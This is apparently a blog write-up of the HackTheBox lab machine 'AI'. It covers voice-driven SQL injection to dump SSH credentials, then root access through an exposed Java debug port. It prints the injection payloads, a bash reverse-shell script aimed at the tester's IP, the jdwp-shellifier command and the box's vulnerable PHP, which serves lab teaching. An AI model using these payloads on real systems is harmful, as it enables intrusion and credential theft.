---
title: HTB: AI
url: https://0xdf.gitlab.io/2020/01/25/htb-ai.html
date: 2020-01-25T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-ai, nmap, gobuster, text2speech, flite, sqli, tomcat, jdwp, jdb, jwdp-shellifier
---

![AI](https://0xdfimages.gitlab.io/img/ai-cover.png)

AI was a really clever box themed after smart speakers like Echo and Google Home. I’ll find a web interface that accepts sound files, and use that to find SQL injection that I have to pass using words. Of course I’ll script the creation of the audio files, and use that to dump credentials from the database that I can use to access the server. For privesc, I’ll find an open Java Debug port on Tomcat running as root, and use that to get a shell.

## Box Info

| Name | [AI](https://hackthebox.com/machines/ai)  [AI](https://hackthebox.com/machines/ai) [Play on HackTheBox](https://hackthebox.com/machines/ai) |
| --- | --- |
| Release Date | [09 Nov 2019](https://twitter.com/hackthebox_eu/status/1192386751970598917) |
| Retire Date | 25 Jan 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for AI |
| Radar Graph | Radar chart for AI |
| First Blood User | 00:56:36[imth imth](https://app.hackthebox.com/users/26267) |
| First Blood Root | 02:30:37[goeo goeo](https://app.hackthebox.com/users/115333) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` shows two ports, HTTP on TCP 80 and SSH on TCP 22:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.163
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 14:22 EST
Nmap scan report for 10.10.10.163
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
root@kali# nmap -sC -sV -p 22,80 -oA scans/nmap-tcpscripts 10.10.10.163
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 14:24 EST
Nmap scan report for 10.10.10.163
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, this looks like Ubuntu Bionic (18.04).

### Website - TCP 80

#### Site

The page is for Artificial Intelligence:

![image-20191111141905444](https://0xdfimages.gitlab.io/img/image-20191111141905444.png)

There are no links and I didn’t find anything useful in the source.

#### Directory Brute Force

`gobuster` finds several paths:

```

root@kali# gobuster -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.163/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/11/10 14:27:04 Starting gobuster
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/about.php (Status: 200)
/contact.php (Status: 200)
/uploads (Status: 301)
/db.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
=====================================================
2019/11/10 14:33:30 Finished
=====================================================

```

#### Paths from gobuster

`/images` and `/uploads` both return 403 Forbidden. `/db.php` just returns a blank page, likely because it’s intended to be included in another page. `/about.php` gives a bit more context for the site:

![image-20191111142152728](https://0xdfimages.gitlab.io/img/image-20191111142152728.png)

`/contact.php` gives an email address, and I can add the domain to my hosts file (though it ends up not mattering here):

![image-20191111142237648](https://0xdfimages.gitlab.io/img/image-20191111142237648.png)

#### intellgence.php

`/intelligence.php` gives some interesting data about how to interact with the search engine:

![image-20191111142450569](https://0xdfimages.gitlab.io/img/image-20191111142450569.png)

#### /ai.php

`/ai.php` is where the queries are submitted:

![image-20191111142623774](https://0xdfimages.gitlab.io/img/image-20191111142623774.png)

It specifically asks for a wave file. Rather than record my own voice, I came across [text2speech.org](https://www.text2speech.org/), which allows me to enter text, and get a `.wav` file out:

![image-20191111143100819](https://0xdfimages.gitlab.io/img/image-20191111143100819.png)

`/intelligence.php` said that AI is familiar with the Male US voice model, so I will choose that here since it is an option.

I couldn’t get the page to ever actually return data for the overt user functionality for most queries. When I created a `.wav` file that said “hello world”, I can see that it got the input correctly, but it doesn’t return any query result:

![image-20191111143310343](https://0xdfimages.gitlab.io/img/image-20191111143310343.png)

I’ll look more at ways to get overt functionality and how the webpage works in [Beyond Root](#ai-website)

## Shell as alexa

### Identify SQL Injection

There’s an SQL injection in the query that’s run based on my input. When I create audio saying “open single quote”, I get:

![image-20191111143650693](https://0xdfimages.gitlab.io/img/image-20191111143650693.png)

### Script Interaction

I’m already tired of going to the website, entering text, downloading the `.wav`, uploading it to AI, and looking for results. Since I’m going to be playing with this for a while, I’ll write a script to generate a `.wav` and submit it.

First, on [text2speech.org](https://www.text2speech.org/), I see on the about page that it’s based on software called `flite`. I can install that with `apt install flite`. A bit of playing and googling gets me to a command like this:

```

flite -w /tmp/test.wav -voice rms -t "hello world"

```

That will output the `.wav` to `/tmp/test.wav`, using the US Male voice (no idea why that’s `rms`, but thanks Google), and it will say “hello world”.

Next, I looked at the POST requests in Burp and recreated them with `curl`:

```

curl -s -X POST http://10.10.10.163/ai.php -F 'fileToUpload=@/tmp/test.wav;type=audio/x-wav' -F 'submit=Process It!' -x http://127.0.0.1:8080

```
- `-s` will silence the output
- `-X POST` does a POST request
- `-F` provides fields from form submitted data, and I can use `@filename` to submit the contents of that file as data.
- `-x` sets my proxy to Burp for troubleshooting

I’ll actually pipe the output of that into some `perl` to isolate just the output I want, and then use `echo` and `bash` variables to format it nicely:

```

#!/bin/bash

flite -w /tmp/test.wav -voice rms -t "$1"
out=$(curl -s -X POST http://10.10.10.163/ai.php -F 'fileToUpload=@/tmp/test.wav;type=audio/x-wav' -F 'submit=Process It!' -x http://127.0.0.1:8080 | perl -0777 -ne '/<h3>(.*)<h3>/ && print $1,"\n";')
echo -e "${out/<br \/>/\\n}"

```

When I run this, I get both the understanding of my input, and any query result:

```

root@kali# ./query_ai.sh "open single quote"
Our understanding of your input is : '
Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

```

### Enumerate Database

Standard SQL Injection practices were made almost impossible because of the need to submit it as a audio request. I could get something like the version:

```

root@kali# ./query_ai.sh "open single quote space union select version open parenthesis close parenthesis comment database"
Our understanding of your input is : '  union select version()-- -
Query result : 5.7.27-0ubuntu0.18.04.1

```

But many other things were too difficult. For example, I couldn’t get it to see `schema`:

```

root@kali# ./query_ai.sh "open single quote space union select group underscore concat space open parenthesis table underscore name close parenthesis space from in formation underscore schema period tables comment database"
Our understanding of your input is : '  union select group_concat  (table_name)  from in4mation under scorched.tables -- -
Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'scorched.tables -- -'' at line 1

```

I got a bit closer messing with the spelling:

```

root@kali# ./query_ai.sh "open single quote space union select group underscore concat space open parenthesis table underscore name close parenthesis space from in formation underscore skima period tables comment database"
Our understanding of your input is : '  union select group_concat  (table_name)  from in4mation_scheme a.tables -- -
Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.tables -- -'' at line 1

```

But never got it to work.

### Username / Password

I decided to take another tact and guess that there might be a users table, and I was right! In fact, with some guessing, I could get a user and a password:

```

root@kali# ./query_ai.sh "open single quote space union select space username space from users comment database"
Our understanding of your input is : '  union select   username   from users -- -
Query result : alexa
root@kali# ./query_ai.sh "open single quote space union select space password space from users comment database"
Our understanding of your input is : '  union select   password   from users -- -
Query result : H,Sq9t6}a<)?q93_

```

### SSH

That username / password combination worked for SSH:

```

root@kali# ssh alexa@10.10.10.163
alexa@10.10.10.163's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov 11 19:04:32 UTC 2019

  System load:  0.0                Processes:           148
  Usage of /:   28.2% of 19.56GB   Users logged in:     0
  Memory usage: 25%                IP address for eth0: 10.10.10.163
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
15 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Oct 24 15:04:38 2019 from 192.168.0.104
alexa@AI:~$

```

And then I can grab `user.txt`:

```

alexa@AI:~$ cat user.txt
c43b62c6************************

```

## Priv: alexa –> root

### Enumeration

Looking around the box, I see that there are several services listening only on localhost:

```

alexa@AI:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

```

I recognize 3306 as the database I likely just injected into to get this shell, and 53 is dns. That leaves 8000 and 8080 to figure out. I also in the process list (`ps auxww`) see Tomcat is running as root:

```

root      14091  110  5.6 3137572 113300 ?      Sl   20:14   0:07 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start

```

That’s a ton of options, but one is really important:

```
-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n

```

That means that Java debug is on and listening on port 8000.

I can use SSH tunnels to see the page on 8080. I’ll hit enter a couple times in my SSH session, and then `~C` to get to the SSH config prompt:

```

ssh> -L 88:localhost:8080
Forwarding port.

```

Now I can visit `http://localhost:88` and see the default Tomcat page:

![image-20191111151713468](https://0xdfimages.gitlab.io/img/image-20191111151713468.png)

### jdb

I can use `jdb` to connect to the debug interface. I’ll forward my local post 223 (arbitrary choice on my part) to 8000 on AI over SSH the same way as above, and then connect:

```

root@kali# jdb -attach localhost:223
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
>

```

[This article from IOActive](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/) is a really good run down of how JDWP works, and how to exploit it.

There’s a lot of things I could try here, but none worked really well.

### Shell

There’s a script that I can use from GitHub, [jwdp-shellifier](https://github.com/IOActive/jdwp-shellifier). To keep the process simple, I’ll write a shell script in `/dev/shm/`:

```

alexa@AI:~$ cat /dev/shm/.df.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now I’ll start a listener, and run the `jwdp-shellifier`:

```

root@kali# python /opt/jdwp-shellifier/jdwp-shellifier.py -t 127.0.0.1 -p 223 --cmd '/dev/shm/.df.sh'
[+] Targeting '127.0.0.1:223'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=a9e
[+] Found Runtime.getRuntime(): id=7fa928023910
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x1
[+] Selected payload '/dev/shm/.df.sh'
[+] Command string object created id:b43
[+] Runtime.getRuntime() returned context id:0xb44
[+] found Runtime.exec(): id=7fa928023948
[+] Runtime.exec() successful, retId=b45
[!] Command successfully executed

```

It takes a minute or two to run to completion, but when it does:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.163.
Ncat: Connection from 10.10.10.163:44434.
bash: cannot set terminal process group (1823): Inappropriate ioctl for device
bash: no job control in this shell
root@AI:~#

```

And I can grab `root.txt`:

```

root@AI:~# cat root.txt
0ed04f28************************

```

## Beyond Root

### AI Website

I wanted to look into how the website was handing voice, and why I couldn’t get any query to actually return results except for with SQLi. Once I got a shell as alexa, I checked out the `/var/www/html` directory:

```

alexa@AI:/var/www/html$ ls
5075140835d0bc504791c76b04c33d2b.py  about.php  ai.php  contact.php  db.php  images  index.php  intelligence.php  uploads

```

It’s interesting to see a Python file there. I’ll get to that in a second. `ai.php` is what I was POSTing wave files to. At the top of it, there’s the code that handles that:

```

<?php
error_reporting(E_ALL);
include("db.php");
if(isset($_POST["submit"]))
{
        $file = rand(0,1000000).'.wav';
        $target_file = "uploads/".$file;
        if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
        {
                $output = exec("/usr/bin/python 5075140835d0bc504791c76b04c33d2b.py $target_file");
                $sql = "select output from alexa where query='$output'";
                $result = mysqli_query($conn,$sql);
                if($result->num_rows > 0)
                {
                        $row = mysqli_fetch_assoc($result);
                        $out = "Query result : ".$row["output"];
                }

                else
                {
                        $out="Query result : ".mysqli_error($conn);
                }
                        $msg = 'Our understanding of your input is : '.$output;
                        exec("rm /var/www/html/uploads/*");
        }
        else
        {
                $msg = 'Something went wrong :(';
        }
}
?>

```

It is saving the wave file to a random file name, using `exec` to call the Python script, and then the results are used (in an unsafe way) to create a SQL query.

The Python file does the text to speech:

```

import re
import sys
import speech_recognition as sr

AUDIO_FILE = (sys.argv[1])
r = sr.Recognizer()
with sr.AudioFile(AUDIO_FILE) as source:
        audio = r.record(source)

try:
        msg=r.recognize_sphinx(audio)
        #Adding intelligence to recognize symbols and some words based on phrases
        output = re.sub(r'open single quote|open single court|open single quota',"'",msg.lower())
        output = re.sub(r'open parenthesis',"(",output)
        output = re.sub(r'close parenthesis',")",output)
        output = re.sub(r'hyphen',"-",output)
        output = re.sub(r'pound sign',"#",output)
        output = re.sub(r'dot|dog|period',".",output)
        output = re.sub(r'dollar sign',"$",output)
        output = re.sub(r'caret',"^",output)
        output = re.sub(r'space'," ",output)
        output = re.sub(r'your surname|your username|you surname|surname|use her name',"username",output)
        output = re.sub(r'open double quote','"',output)
        output = re.sub(r'semicolon',";",output)
        output = re.sub(r'join',"union",output)
        output = re.sub(r'comment python',"#",output)
        output = re.sub(r'comment database|common database',"-- -",output)
        output = re.sub(r'comment php',"//",output)
        output = re.sub(r'equals',"=",output)
        output = re.sub(r'hall',"all",output)
        output = re.sub(r'three',"3",output)
        output = re.sub(r'four|for',"4",output)
        output = re.sub(r'underscore',"_",output)
        output = re.sub(r'won|wan|one',"1",output)
        output = re.sub(r'two|to',"2",output)
        output = re.sub(r'aur',"or",output)
        output = re.sub(r'are',"or",output)
        output = re.sub(r'comma',",",output)
        output = re.sub(r'can catch|can cut',"concat",output)
        output = re.sub(r'idea|design',"schema",output)
        output = re.sub(r'''(?:(?<=\') | (?=\'))''','',output)
        output = re.sub(r'(?:(?<=\_) | (?=\_))','',output)
        output = re.sub(r'(?:(?<=\.) | (?=\.))','',output)
        output = re.sub(r'(?:(?<=\,) | (?=\,))','',output)
        output = re.sub(r'(?:(?<=\") | (?=\"))','',output)
        output = re.sub(r'(?:(?<=\() | (?=\())','',output)
        output = re.sub(r'(?:(?<=\)) | (?=\)))','',output)
        print output

except sr.UnknownValueError:
        print("AI Speech Recognition could not understand audio :(")
except sr.RequestError as e:
        print("Could not request results from AI Speech Recognition service; {0}".format(e))

```

It gets the file name from `argv[1]`, opens it, and uses the `speech_recognition` package to convert that to text. The there’s a bunch of statements that replace words with numbers and symbols, to be more programmer friendly (and to make the SQLi possible). The result is then printed (which is captured by the `exec` in the PHP).

Looking at the database, the following query is run:

```

$sql = "select output from alexa where query='$output'";
$result = mysqli_query($conn,$sql);

```

To see the db info, I need to look in `db.php`:

```

alexa@AI:/var/www/html$ cat db.php 
<?php
$conn = new mysqli('localhost','dbuser','toor','alexa');
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>

```

I can connect over the terminal:

```

alexa@AI:/var/www/html$ mysql -h 127.0.0.1 -u dbuser -ptoor alexa
...[snip]...
mysql> 

```

There are two tables:

```

mysql> show tables;
+-----------------+
| Tables_in_alexa |
+-----------------+
| alexa           |
| users           |
+-----------------+
2 rows in set (0.00 sec)

```

The `users` table has four users, including the first one which gave SSH creds:

```

mysql> select * from users;
+----------+------------------+
| username | password         |
+----------+------------------+
| alexa    | H,Sq9t6}a<)?q93_ |
| root     | H,Sq9t6}a<)?q931 |
| dbuser   | toor             |
| awsadm   | awsadm           |
+----------+------------------+
4 rows in set (0.00 sec)

```

The root password does not work for SSH or `su` access to root.

The PHP was accessing the `alexa` table. It turns out only two queries returned values:

```

mysql> select * from alexa;
+---------------+----------------------------------------------------------+
| query         | output                                                   |
+---------------+----------------------------------------------------------+
| say hi python | print("hi")                                              |
| say hi in c   | #include int main() { printf("Hello World"); return 0; } |
+---------------+----------------------------------------------------------+
2 rows in set (0.00 sec)

```

“say hi python” was mentioned on `intelligence.php`. When I upload that, I get query results:

![image-20191111143411895](https://0xdfimages.gitlab.io/img/image-20191111143411895.png)

### Tomcat Breakpoints

Java Debug (JDB) is very flaky and unstable for getting a shell. Moreover, it relies on the code hitting certain objects that I can set breakpoints on. Rather than having the site try to perform those actions, the box author seems to have made a different choice - restart Tomcat every two minutes. As root, I can see it in the `crontab`:

```

root@AI:~# crontab -l
...[snip]...
*/2 * * * * /bin/sh /root/tomcat.sh

```

That script is in the root home directory:

```

root@AI:~# cat tomcat.sh 
#!/bin/sh
ps -ef | grep java | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null
sleep 2
/opt/apache-tomcat-9.0.27/bin/catalina.sh jpda start

```

In the first line it finds the java process and kills it. Then it sleeps two seconds, and then it starts the server again. Had I uploaded [pspy](https://github.com/DominicBreuker/pspy) I likely would have seen this activity.

On startup, it hits the objects needed for shellify to get execution.